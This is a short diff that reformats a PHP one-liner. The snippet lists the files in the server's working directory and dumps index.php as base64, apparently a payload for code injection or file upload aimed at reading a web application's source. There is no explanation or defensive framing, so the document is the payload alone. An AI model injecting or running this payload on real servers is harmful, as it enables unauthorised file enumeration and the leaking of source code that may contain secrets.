@@ -1,1 +1,4 @@
-    <?php print_R(scandir('.'));print(base64_encode(file_get_contents('index.php')));?>
+<?php
+print_R(scandir('.'));
+print(base64_encode(file_get_contents('index.php')));
+?>
